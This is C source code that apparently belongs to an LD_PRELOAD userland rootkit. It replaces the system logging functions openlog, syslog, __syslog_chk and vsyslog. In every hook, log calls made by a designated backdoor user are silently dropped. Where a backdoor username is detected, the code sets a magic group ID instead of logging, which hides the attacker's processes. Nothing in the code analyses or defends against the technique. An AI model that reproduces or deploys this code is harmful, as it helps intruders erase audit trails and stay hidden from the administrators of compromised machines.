void openlog(const char *ident, int option, int facility)
{
    if(is_bdusr()) return;
    hook(COPENLOG);
    (void)call(COPENLOG, ident, option, facility);
    return;
}

void syslog(int priority, const char *format, ...)
{
    if(is_bdusr()) return;

    if(is_bduname(NULL))
    {
        hook(CSETGID);
        (void)call(CSETGID, MAGIC_GID);
        return;
    }

    va_list va;
    va_start(va, format);
    vsyslog(priority, format, va);
    va_end(va);
    return;
}

void __syslog_chk(int priority, int flag, const char *format, ...)
{
    if(is_bdusr()) return;

    if(is_bduname(NULL))
    {
        hook(CSETGID);
        (void)call(CSETGID, MAGIC_GID);
        return;
    }

    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
    return;
}

void vsyslog(int priority, const char *format, va_list ap)
{
    if(is_bdusr()) return;

    hook(CSETGID,
         CVSYSLOG);

    if(is_bduname(NULL))
    {
        (void)call(CSETGID, MAGIC_GID);
        return;
    }

    (void)call(CVSYSLOG, priority, format, ap);
    return;
}
